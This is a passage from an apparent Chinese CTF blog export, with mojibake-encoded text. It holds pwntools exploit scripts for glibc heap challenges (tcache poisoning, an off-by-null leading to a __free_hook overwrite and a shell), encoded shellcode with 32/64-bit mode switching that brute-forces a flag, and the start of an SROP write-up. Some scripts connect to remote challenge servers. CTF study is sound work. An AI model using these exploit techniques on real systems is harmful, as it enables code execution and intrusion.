log.info(\"libc_base:0x%x\"%libc_base)\n    log.info(\"system_addr:0x%x\"%system_addr)\n    log.info(\"__free_hook_addr:0x%x\"%__free_hook_addr)\n\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x18,'PIG007NB')\n    new(0x18,'PIG007NB')\n\n\n    #one_gadget = libc_base + 0xdf54c\n    new(0x88, p64(__free_hook_addr^(heap_base/0x1000)))\n    new(0x38, p64(system_addr))\n    new(0x38, p64(system_addr))\n\n    new(0x10, '/bin/sh\\x00')\n    pause()\n    free()\n    p.interactive()\n\ncount = 1\nwhile True:\n    try:\n        print('the no.' + str(count) + ' try')\n        p = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n        #p = remote('node3.buuoj.cn', 26018)#process('./ff') #\n        exp()\n        \n    except Exception as e:\n    \tprint(e)\n        p.close()\n        count = count + 1\n        continue\n```\n\n \n\nâ–²æ€»ç»“ä¸€ä¸‹ï¼š\n\n(1)IO_FILEçš„æ–°çŸ¥è¯†ï¼š\n\nnew(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n\n(2)2.32Tcacheæœºåˆ¶ï¼š\n\nâ‘ æ”¾å…¥tcacheå¯¹åº”biné“¾è¡¨æ—¶ä¼šå¼‚æˆ–heap_base/0x1000ï¼Œå¹¶ä¸”fdä¹Ÿä¼šå˜åŒ–ã€‚\n\nâ‘¡biné“¾è¡¨ä¸­çš„countå’Œç”³è¯·ä¸å¦çš„å…³ç³»ï¼š\n\nå¦‚æœtcacheçš„å¯¹åº”binçš„countä¸º0ï¼Œåˆ™ä¸ä¼šä»è¯¥Tcacheä¸­ç”³è¯·ã€‚\n\nå¦‚æœå¤§äºç­‰äº1ï¼Œé‚£ä¹ˆå°±éœ€è¦çœ‹tcacheç»“æ„ä½“ä¸Šå¯¹åº”biné“¾è¡¨å­˜æ”¾çš„chunkåœ°å€æ˜¯å¦ä¸ºä¸€ä¸ªåˆæ³•çš„äº†ï¼Œå¦‚æœä¸åˆæ³•åˆ™ä¼šç”³è¯·å¤±è´¥ï¼Œç¨‹åºé€€å‡ºã€‚(åº”è¯¥éƒ½æ˜¯è¿™æ ·çš„)\n\nâ‘¢éœ€è¦ä¿®æ”¹Keyå­—æ®µæ‰èƒ½double freeï¼Œå³free çš„æ—¶å€™ä¼šæ£€æµ‹ key å­—æ®µæ˜¯å¦ä¸º tcacheï¼Œå¦‚æœç›¸ç­‰åˆ™æ£€æµ‹ free çš„æŒ‡é’ˆå€¼æ˜¯å¦åœ¨å¯¹åº”çš„tcacheçš„binä¸Šï¼Œå¦‚æœåœ¨åˆ™è§†ä¸ºç¨‹åºåœ¨ double freeï¼Œè¿›è€Œç»ˆæ­¢ç¨‹åºã€‚\n\n","tags":["Tcache"],"categories":["PWN","pwnå †-Tcache"]},{"title":"2021-QWB","url":"/2021/08/14/2021-QWB/","content":"\nä¸€ã€baby_diary\n\n2.31ä¸‹çš„off-by-nullï¼Œå¤šæº¢å‡ºåŠä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æ€»å…±éœ€è¦çˆ†ç ´ä¸€ä¸ªå­—èŠ‚ã€‚è¿™é‡Œè¿˜éœ€è¦ç»•è¿‡readçš„æ£€æŸ¥ï¼Œä¸è¿‡æˆ‘è¿™ä¸ªå¸ƒå±€å®Œä¹‹ååˆšå¥½å¯ä»¥é€šè¿‡ï¼Œä¹Ÿå°±æ²¡å¤ªç®¡äº†ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./baby_diary\"\nlibc_file = \"./libc-2.31.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so  \n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc-2.31.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\nmenu = \">> \"\n\n\ndef add(size, con):\n\tsla(menu, \"1\")\n\tsla(\"size: \", str(size))\n\tsla(\"content: \", con)\n\ndef delete(idx):\n\tsla(menu, \"3\")\n\tsla(\"index: \", str(idx))\n\ndef show(idx):\n\tsla(menu, \"2\")\n\tsla(\"index: \", str(idx))\n\n\ndef pwn():\n\n\n    #(1)å‰æœŸå‡†å¤‡åŠ å †å¸ƒå±€:\n    for i in range(7): # 0-6\n        add(0x2000-1, \"/bin/sh\\x00\")\n    add(0x2000-0x1410-0x40-1, \"padding\") # 7\n\n    for i in range(7): # 8-14\n        add(0x28-1, 'tcache')\n\n    #crux chunk15\n    add(0xb20-1, \"largebin\") # 15\n    #prevent merge\n    add(0x10-1, \"padding\") # 16\n\n\n\n\n    #(2)åˆ¶ä½œfake_chunkï¼Œåˆ©ç”¨largebinè¸©ä¸‹fd_nextsizeå’Œbk_nextsize:\n    delete(15)\n\n    #chunk15 to largebin\n    add(0x1000-1, '\\n') #15\n    #make fake_chunk in chunk17\n    add(0x28-1, p64(0x6) + p64(0x601) + p8(0x40)) #17\n\n\n\n    #(3)è”åŠ¨fastbinå’Œsmallbinï¼š\n    add(0x28-1, '\\x18') # 18\n    add(0x28-1, '\\xaa') # 19\n    add(0x28-1, '\\x20') # 20\n    add(0x28-1, '\\x21') # 21\n    # fill in tcache(0x30)\n    for i in range(7): # 8-14\n        delete(8 + i)\n\n    delete(20)\n    delete(18)\n\n    # clear tcache(0x30)\n    for i in range(7): # 8-14\n        add(0x28-1, '\\x08')\n\n    # fastbin to smallbin\n    add(0x400-1, '\\x20') #18\n\n    # get chunk18 from smallbin ,chunk20 to tcache\n    # change chunk18->bk to point to fake_chunk\n    add(0x28-1, p64(0) + p8(0x20)) #20\n\n\n\n    #(4)åˆ©ç”¨fastbinä¿®æ”¹chunk17->fdï¼š\n    # clear chunk from tcache\n    add(0x28-1, 'clear') # 21 from tcache \n\n    for i in range(7): # 8-14\n        delete(8 + i)\n\n    # free to fastbin\n    delete(19)\n    delete(17)\n\n    for i in range(7): # 8-14\n        add(0x28-1, '\\x08')\n\n    # change chunk17->fd to point to fake_chunk\n    add(0x28-1, p8(0x20)) #17\n\n\n    #(5)è§¦å‘off-by-null:\n    add(0x28-1, \"\\x19\")# 19 from fastbin\n    show(19)\n\n    add(0x108-1, \"\\x23\") # 23 cutting from chunk15 in unsortebin,for overwrite\n    add(0x518-1, \"\\x24\") # 24 legacy from chunk15 in unsortebin,for trigger off-by-null\n    #add(0x100-1, \"padding\") # 24\n    # off-by-null \n\n    delete(23)\n    add(0x108-1,p64(0x0)*0x21)\n    delete(23)\n    add(0x108-1,p64(0x0)*0x1f+\"\\x00\"*7+\"\\x06\")\n    #edit(22, \"a\"*0x20 + p64(0x520))\n    # trigger\n    delete(24)\n    add(0x4e8-1,\"padding\")\n    show(23)\n    ru(\"content: \")\n    main_arena = u64(rc(6).ljust(8,\"\\x00\"))-96\n    malloc_hook = main_arena-0x10\n    libc_base = malloc_hook - libc.sym['__malloc_hook']\n    free_hook = libc_base + libc.sym['__free_hook']\n    system_addr = libc_base + libc.sym['system']\n    log.info(\"system_addr:0x%x\"%system_addr)\n    log.info(\"libc_base:0x%x\"%libc_base)\n\n    delete(24)\n    delete(1)\n    delete(2)\n    delete(3)\n    delete(8)\n    delete(19)\n    add(0x4e8-1,p64(0x30)*8+p64(0x30)+p64(0x31)+p64(free_hook))\n    add(0x28-1,\"padding\")\n    add(0x28-1,p64(system_addr))\n    delete(0)\n    p.interactive()\n    #add(0x18-1,\"A\")\n    #add(0x18-1,\"B\")\n    #delete(0)\n    #add(0x18-1,p64(0x0)*2+(\"\\x30\"+\"\\x20\").ljust(8,\"\\x00\"))\n    #pause()\n\n\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    #p = process(binary)\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc-2.31.so\"})\n    p = remote(\"8.140.114.72\",1399)\n    try:\n        pwn()\n        p.recv(timeout = 0.5) \n        #è¦ä¹ˆå´©æºƒè¦ä¹ˆçˆ†ç ´æˆåŠŸï¼Œè‹¥å´©æºƒioä¼šå…³é—­ï¼Œio.recv()ä¼šè§¦å‘   EOFError\n        EOFError\n    except EOFError:\n        p.close()\n        continue\n    else:\n        sleep(0.1)\n        p.sendline(\"1\")\n        pause()\n        break\n```\n\n \n\näºŒã€shellcodeï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_16-43-10.png)\n\nåªæœ‰ç³»ç»Ÿå·0x9,0x5,0x25,0x0,0xe7æ‰èƒ½æ­£å¸¸è¢«æ‰§è¡Œï¼Œè€Œ0x5åœ¨32ä½ä¸‹æ˜¯openï¼Œå³å¯ä»¥åˆ©ç”¨åˆ°openï¼Œmmapï¼Œå’Œreadå‡½æ•°ã€‚å¯¹äºORWå°‘äº†ä¸€ä¸ªWï¼Œå¯ä»¥ä½¿ç”¨flagçš„é€ä¸ªå­—ç¬¦æ¯”è¾ƒçš„æ–¹æ³•æ¥çˆ†ç ´å‡ºflagã€‚ç”±äºåˆ‡æ¢retfqéœ€è¦æ¶‰åŠåˆ°æ„é€ 32ä½çš„æ ˆåœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œæœ€å¥½è¿˜æ˜¯ç”¨mmapæ¥ç”³è¯·æŒ‡å®šä½ç½®çš„ä¸€ç‰‡ç©ºé—´ï¼Œä»è€ŒåŠ«æŒæ ˆã€‚\n\n(1)mmapçš„è®¾ç½®ï¼š\n\n```python\nshellcode_mmap = '''\n/*mmap(0x40404040,0x7e,,0x7,0x22,0,0)*/\nxor rax,rax\n\n/*set rdx*/\nmov al,0x7\npush rax\npop rdx\n\n/*set rcx*/\nmov al,0x22\npush rax\npop rcx\n\n/*set rdi*/\nxor rdi,rdi\nmov edi,0x40404040\n\n/*set rsi*/\nmov al,0x7e\npush rax\npop rsi\n\n/*set rax*/\nmov al,0x9\n\n/*set r8,r9*/\nxor r8,r8\nxor r9,r9\n\nsyscall\n'''\n```\n\nè¿™é‡Œç”±äºå¯¹è¾“å…¥å­—ç¬¦åšäº†é™åˆ¶ï¼Œåªèƒ½æ˜¯å¯è§å­—ç¬¦ï¼ŒåŒæ—¶ç”±äºè¿™é‡Œä½¿ç”¨alpha3è¿™ä¸ªå·¥å…·æ¥å°†shellcodeç¼–ç æˆå¯è§å­—ç¬¦ã€‚ä½†æ˜¯è¿™ä¸ªå·¥å…·æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯ä¸èƒ½å‡ºç°\\x00è¿™ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬ä½¿ç”¨mov rax,0x9åˆ™ä½¿å¾—0x9åœ¨64ä½æ˜¯0x0000000000000009ï¼Œå­˜åœ¨\\x00å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°al,dl,ç­‰8ä½å¯„å­˜å™¨ï¼Œæ¥è½¬æ¢ä¸€ä¸‹ã€‚\n\n(2)readçš„è®¾ç½®ï¼š\n\n```python\nshellcode_read = '''\n/*read(0,0x40404040,0x70)*/\nxor rax,rax\nxor rdi,rdi\nxor rsi,rsi\nmov esi,0x40404040\nxor rdx,rdx\nmov dl,0x70\nsyscall\n'''\n```\n\nè¯»å…¥åˆ°ä¹‹å‰ç”¨mmapå¼€è¾Ÿçš„ç©ºé—´0x40404040å¤„ã€‚\n\n(3)retfqçš„è®¾ç½®ï¼š\n\n```python\nshellcode_retfq = '''\nmov esp,0x40404440\npush 0x23\npush 0x40404040\nretfq\n'''\n```\n\nâ‘ éœ€è¦32ä½çš„æ ˆï¼ŒåŒæ—¶åŠ«æŒespï¼Œä½¿å¾—æ ˆä¸Šçš„å®Œå…¨å¯æ§ï¼Œé˜²æ­¢pushå‡ºé”™ã€‚\n\nâ‘¡è¿™é‡Œ0x23ä¸ºè½¬32ä½ï¼Œ0x33ä¸ºè½¬64ä½ã€‚\n\nâ‘¢push 0x40404040æ˜¯åœ¨retfqä¹‹åè·³è½¬çš„åœ°æ–¹ï¼Œéœ€è¦æ”¾åˆ°æ ˆä¸Šã€‚\n\nâ–²æ±‡ç¼–ç‚¹ï¼šå­˜åœ¨xor,mov,retfqå¤šçš„æ—¶å€™ï¼Œéœ€è¦æ˜¯ï¼šshellcode_x64 = asm(shellcode_x64,arch = 'amd64',os='linux')æ‰è¡Œã€‚\n\nä»¥ä¸Šçš„å¾ˆå¤šä¸å¤ªçŸ¥é“åŸç†ï¼Œå…·ä½“çš„åœ¨å…·ä½“ç”¨åˆ°æ—¶å€™å†æ”¹ã€‚\n\n(4)orwä¸­çš„orè®¾ç½®ï¼š\n\n```python\nshellcode_open = '''\nmov eax, 5\npush 0x67616c66\nmov ebx, esp\nxor ecx, ecx\nint 0x80\nmov ecx, eax\n'''\n\nshellcode_to64 = '''\npush 0x33\npush 0x4040402b\nretfq\n'''\n\nshellcode_read_flag = '''\nmov rdi,rcx\nmov rsi,rsp\nmov rdx,0x70\nxor rax,rax\nsyscall\n'''\n```\n\n(5)çˆ†ç ´çš„æ±‡ç¼–ä»£ç è®¾ç½®ï¼š\n\n```python\nif flag_pos == 0:\n    shellcode = \"cmp byte ptr[rsp+{0}], {1}; jz $-4; ret\".format(flag_pos, ch)\nelse:\n    shellcode = \"cmp byte ptr[rsp+{0}], {1}; jz $-5; ret\".format(flag_pos, ch)\n```\n\nè¿™é‡Œçš„chå³ä¸ºå¾ªç¯çš„å¯è§å­—ç¬¦ï¼Œflag_posæ˜¯è¯»å‡ºflagçš„å¯¹åº”ä½ç½®ï¼Œä½†æ˜¯åŸç†å°±æ˜¯å°†è¯»å–çš„flagéå†æ¯”è¾ƒæ‰€æœ‰å¯è§å­—ç¬¦ï¼Œç›¸ç­‰åˆ™ä½¿å¾—ç¨‹åºè·³å…¥å¾ªç¯ä¸­ï¼Œç„¶åå°±å¯ä»¥é€šè¿‡è®¾ç½®timeoutä¸ºæŸä¸ªå€¼æ¥åˆ¤æ–­è¿™ä¸ªå­—ç¬¦æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰åˆ™åŠ å…¥åˆ°flagä¸­ã€‚ç±»ä¼¼çš„æœ‰ï¼š\n\n```python\ncheck = '''\nmov dl, byte ptr [rsi+{}]\nmov cl, {}\ncmp cl,dl\njz loop\nmov al,231\nsyscall\nloop:\njmp loop\n'''.format(reloc,ch)\n```\n\nè¿™é‡Œå°±ç”¨åˆ°äº†exit_groupï¼Œå¦å¤–rsp,rsi,ç”šè‡³rbxéƒ½å¯ä»¥çš„ï¼Œå› ä¸ºè¯»å–ä¹‹åè¿™ä¸‰ä¸ªå¯„å­˜å™¨éƒ½ä¿å­˜äº†flagçš„å€¼ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_22-28-12.png)\n\n(6)æ±‡æ€»ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nfrom pwn import * \n\nshellcode_open = '''\n    mov eax, 5\n    push 0x67616c66\n    mov ebx, esp\n    xor ecx, ecx\n    int 0x80\n    mov ecx, eax\n    '''\n\nshellcode_to64 = ''' \n    push 0x33\n    push 0x4040405b\n    retfq\n'''\n\nshellcode_read_flag = '''\n    mov rdi,rcx\n    mov rsi,rsp\n    mov rdx,0x70\n    xor rax,rax\n    syscall\n'''\n\nshellcode_open = asm(shellcode_open)\nshellcode_to64 = asm(shellcode_to64,arch = 'amd64',os = 'linux')\nshellcode_read_flag = asm(shellcode_read_flag,arch = 'amd64',os = 'linux')\n\n\ndef pwn(p, flag_pos, ch):\n        payload = \"Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103e4A070c7o4D0c1P0n0x0R3X8P0t140p2C4A2N1P005p0q1M0c3c2u194Y7o0q0y154008135L1L0p3T400q2p0p0p1M0A3r3S0A0B053O0s2G0r051k2z1l2y0w2O0p093k0y\"\n        p.sendline(payload)\n        sc = asm('''\n        mov dl, byte ptr [rsi+{}]\n        mov cl, {}\n        cmp cl,dl\n        jz loop\n        mov al,231\n        syscall\n        loop:\n        jmp loop\n        '''.format(flag_pos,ch),arch = 'amd64',os = 'linux')\n\n        if flag_pos == 0:\n            shellcode = \"cmp byte ptr[rsp+{}], {}; jz $-4; ret\".format(flag_pos, ch)\n        else:\n            shellcode = \"cmp byte ptr[rsp+{}], {}; jz $-5; ret\".format(flag_pos, ch)\n        check = asm(shellcode, arch='amd64', os='linux')\n\n        payload = shellcode_open + shellcode_to64 + shellcode_read_flag + check \n        #pause()\n        p.send(payload)\n        #pause()\n\nmy_flag = \"\"\nflag_pos = 0\nwhile True:\n    for ch in range(33, 127):\n        #p = remote(\"39.105.137.118\", 50050)\n        p = process(\"./shellcode\")\n        try:\n            print(ch)\n            pwn(p, flag_pos, ch)\n            p.recvline(timeout=3.0)\n            my_flag = my_flag + chr(ch)\n            print(\"=>\", my_flag)\n            flag_pos += 1\n            p.close()\n            break\n        except EOFError:\n            ch += 1\n            p.close()\n    if(my_flag[-1] == '}'):\n        break\nlog.info(\"flag:%s\"%my_flag)\n```\n\n \n\n \n\n \n","tags":["æ¯”èµ›"],"categories":["PWN"]},{"title":"360ichunqiu 2017-smallest","url":"/2021/08/14/360ichunqiu 2017-smallest/","content":"\n1.å¸¸è§„checksecï¼Œå¼€äº†ä¸€ä¸ªNXï¼Œæ²¡åŠæ³•shellcodeã€‚IDAæ‰“å¼€æŸ¥çœ‹ç¨‹åºï¼Œæ‰¾æ¼æ´ï¼Œæœ‰ä¸ªå±çš„æ¼æ´ï¼Œåªæœ‰ä¸€ä¸ªsyscallçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå„ç§æ ˆæ“ä½œä¹Ÿæ²¡æœ‰ã€‚\n\n2.è§‚å¯Ÿè¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œç³»ç»Ÿè°ƒç”¨å‚æ•°é€šè¿‡edx,rsi,rdièµ‹å€¼ï¼Œedxç›´æ¥è¢«èµ‹å€¼ä¸º400hï¼Œbufå¯¹åº”çš„rsiè¢«rspèµ‹å€¼ï¼Œç³»ç»Ÿè°ƒç”¨å·fdå¯¹åº”çš„rdiè¢«raxèµ‹å€¼ã€‚å†æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œæœ‰xor rax,raxï¼Œæ‰€ä»¥raxä¸€å®šæ˜¯0ï¼Œé‚£ä¹ˆè¿™ä¸ªsyscallç³»ç»Ÿè°ƒç”¨çš„å°±æ˜¯readå‡½æ•°ï¼Œè¯»å–çš„æ•°å–ç›´æ¥å­˜å…¥æ ˆé¡¶ã€‚ç”±äºbufå¤§å°ä¸º400hï¼Œä¸”åªæœ‰ä¸€ä¸ªsyscallï¼Œä¹‹åç›´æ¥retnï¼Œæ²¡æœ‰leaveæŒ‡ä»¤ï¼Œè¿™å°±ä»£è¡¨äº†rspæŒ‡å‘çš„åœ°å€å°±æ˜¯æˆ‘ä»¬æ‰§è¡Œå®Œsyscallåstartå‡½æ•°retnçš„è¿”å›åœ°å€(pop eip)ã€‚ä¹Ÿå°±æ˜¯å¦‚æœè¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œè¯»å–å®Œä¹‹åï¼Œé€šè¿‡retnå°±ä¼šè·³è½¬åˆ°è¯¥åœ°å€ä¸­ã€‚å¦å¤–ç¨‹åºä¸­é™¤äº†retnä¹‹å¤–æ²¡æœ‰å…¶å®ƒå¯¹æ ˆå¸§è¿›è¡Œæ“ä½œçš„æŒ‡ä»¤ï¼Œå¦‚æœè¾“å…¥å¤šä¸ªsyscallåœ°å€ï¼Œå°±å¯ä»¥åå¤æ‰§è¡Œsyscallã€‚å¹¶ä¸”æœ€å¼€å§‹è¾“å…¥400hå­—èŠ‚ï¼Œç¨‹åºæµå®Œå…¨å¯æ§ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527242.jpeg)\n\n3.é¦–å…ˆæƒ³åˆ°ropï¼Œä½†æ˜¯é¢˜ç›®æ²¡ç»™Libcï¼Œå¹¶ä¸”é€šè¿‡è°ƒè¯•å‘ç°ï¼Œè¿™ä¸ªç¨‹åºå‹æ ¹å°±æ²¡å¯¼å…¥å¤–éƒ¨çš„Libcåº“ï¼ŒIDAä¸­æ‰“å¼€æ²¡æœ‰externï¼Œå®Œå…¨æ²¡åŠæ³•å¸¸è§„ropï¼Œé‚£ä¹ˆæƒ³ç”¨SROPã€‚è¿œç¨‹è°ƒè¯•ä¸€ä¸‹æŸ¥çœ‹å †æ ˆæ•°æ®ï¼Œå‘ç°ä¸´æ—¶åˆ›å»ºçš„smallestæ®µæ•°æ®æ²¡æœ‰å¯å†™æƒé™ï¼Œèƒ½å¤Ÿåˆ©ç”¨çš„åªæœ‰[stack]æ ˆæ•°æ®ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦å…ˆæ³„éœ²ä¸€ä¸ªæ ˆåœ°å€æ¥è®©æˆ‘ä»¬èƒ½å¤Ÿå¾€æ ˆä¸­å†™å…¥æ•°æ®binshä»è€Œè°ƒç”¨execve(â€˜/bin/sh\\x00â€™ï¼Œ0ï¼Œ0)æ¥ç›´æ¥getshellã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527471.jpeg)\n\n4.ä¹‹åè§‚å¯Ÿæ ˆä¸Šçš„æ•°æ®ï¼Œå‘ç°å½“è¿è¡Œåˆ°syscallæ—¶ï¼Œrspä¸‹æ–¹çš„å†…å®¹å…¨æ˜¯æ ˆä¸Šçš„åœ°å€ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527913.jpeg)\n\nrbpä¸€ç›´éƒ½æ˜¯0x000......è¿™æ˜¯å› ä¸ºç¨‹åºåªæœ‰ä¸€ä¸ªstartå‡½æ•°ï¼Œæ ¹æœ¬å°±æ²¡æœ‰ä¸ºå‡½æ•°å†æ¬¡åˆ›å»ºæ ˆï¼Œæ‰€ç”¨çš„åªæ˜¯æœ€åˆç”Ÿæˆçš„æ ˆç©ºé—´ã€‚æ ¹æ®è¿™ä¸ªåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨sys_writeå‡½æ•°ï¼Œæ¥æ‰“å°rspæŒ‡å‘çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯æŸä¸ªæ ˆåœ°å€ï¼Œè¿™æ ·å°±æˆåŠŸæ³„éœ²æ ˆåœ°å€ã€‚\n\n5.ä½†æ˜¯sys_writeçš„è°ƒç”¨å·æ˜¯1ï¼Œè€Œé€šè¿‡è°ƒè¯•å‘ç°raxçš„åˆå§‹å€¼è¢«é»˜è®¤è®¾ç½®ä¸º0ï¼Œå¹¶ä¸”ç¨‹åºä¸­æ²¡æœ‰ä»»ä½•ä¿®æ”¹raxçš„ä»£ç ã€‚å”¯ä¸€ä¸€ä¸ªä¹Ÿåªæœ‰xor   rax, raxï¼Œä½†æ˜¯ä»»ä½•æ•°å’Œæœ¬èº«å¼‚æˆ–çš„ç»“æœéƒ½æ˜¯0ï¼Œæ‰€ä»¥å¦‚æœç¨‹åºæ¯æ¬¡éƒ½ä»è¿™è¡Œä»£ç æ‰§è¡Œï¼Œé‚£ä¹ˆæ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨å·æ°¸è¿œéƒ½æ˜¯0ï¼Œä¹Ÿå°±æ˜¯ä¼šæ— é™å¾ªç¯readã€‚è¿™é‡Œæƒ³åˆ°ç”±äºæ ˆå®Œå…¨å¯æ§ï¼Œå¹¶ä¸”è¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œç¨‹åºæ‰§è¡Œå®Œè¿™ä¸ªåœ°å€å¯¹åº”çš„å‡½æ•°åretnä¼šç›´æ¥è·³è½¬åˆ°rspçš„ä¸‹ä¸€è¡Œã€‚è¿™é‡Œé€‰æ‹©è®©ç¨‹åºå†æ‰§è¡Œä¸€æ¬¡sys_readå‡½æ•°ï¼Œä¹‹åæˆ‘ä»¬ä¸ºå…¶ä¸­ä¸€æ¬¡è¾“å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”è¿™æ¬¡è¿”å›ä¸å†ä»xorè¿™è¡Œä»£ç å¼€å§‹æ‰§è¡Œï¼Œä»mov rsi, rspå¼€å§‹ã€‚ç”±äºsys_readçš„è¿”å›å€¼è‡ªåŠ¨å†™å›ç»™rax(ä¸€èˆ¬å‡½æ•°çš„è¿”å›å€¼éƒ½ä¼šå†™ç»™rax)ï¼Œæ‰€ä»¥è¯»å–å‡ ä¸ªå­—èŠ‚readå°±å‘raxå†™å…¥å¤šå°‘ï¼Œè¿™æ ·å°±ä¼šä½¿å¾—raxä¹Ÿå¯ä»¥å¾—åˆ°æ§åˆ¶ï¼Œä¸å†è¢«xorä¸º0ï¼Œè°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•°ã€‚\n\n6.æ‰€ä»¥ç¼–å†™payload:å…ˆå°è¯•ä¸€ä¸‹çœ‹èƒ½å¦æ³„éœ²æ ˆåœ°å€ï¼Œtest1.py\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += p64(start_addr)\npayload += p64(set_rsi_rdi_addr)\npayload += p64(start_addr)\n#æ³„éœ²æ ˆåœ°å€ä¹‹åè¿”å›åˆ°startï¼Œæ‰§è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚\nio.send(payload)\nsleep(3)\nio.send(payload[8:8+1])\n```\n\n\\#åˆ©ç”¨sys_readéšä¾¿è¯»å–ä¸€ä¸ªå­—ç¬¦ï¼Œè®¾ç½®rax = 1ï¼Œç”±äºretnå…³ç³»ï¼Œrspä¸‹æ‹‰äº†ä¸€ä¸ªå•ä½ï¼Œæ‰€ä»¥è¿™é‡Œä¼šè¯»å…¥åˆ°åŸå…ˆçš„rsp+0x8å¤„ï¼Œä¹Ÿå°±æ˜¯ä»åŸå…ˆçš„Payloadä¸­ç¬¬8ä¸ªå­—ç¬¦å¼€å§‹ï¼ŒæŠ½å–ä¸€ä¸ªå­—ç¬¦ï¼Œå°±æ˜¯set_rsi_rdi_addrçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä¸ºäº†ä¸æ”¹å˜è¿”å›åœ°å€ã€‚å¦‚æœå†™æˆï¼šio.send(â€˜\\xb8â€™)æ•ˆæœä¸€æ ·ï¼Œéƒ½æ˜¯ä¸ºäº†ä¸æ”¹å˜è¿”å›åœ°å€ã€‚ä¹‹åå†æ‰§è¡Œset_rsi_rdi_addrä»è€Œæ‰§è¡Œwriteå‡½æ•°ï¼Œ\n\n```\n#æ³¨é‡Šå¤´\n\nstack_addr = u64(io.recv()[8:16]) + 0x100\n#ä»æœ€åˆçš„rsp+0x10å¼€å§‹æ‰“å°400å­—èŠ‚æ•°æ®ï¼Œé‚£ä¹ˆä»æ³„éœ²çš„æ•°æ®ä¸­æŠ½å–æ ˆåœ°å€ï¼Œ+0x100é˜²æ­¢æ ˆæ•°æ®è¿‡è¿‘è¦†ç›–\nlog.info('stack addr = %#x' %(stack_addr))\n```\n\n7.è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆåŠŸæ³„éœ²äº†ä¸€ä¸ªæ ˆåœ°å€ï¼Œä½†æ˜¯ä¸èƒ½å†ç”¨ç®€å•è¯»å…¥binshå­—ç¬¦ä¸²ä¹‹åè®¾ç½®SigreturnFrameç»“æ„ä½“æ¥getshellï¼Œå› 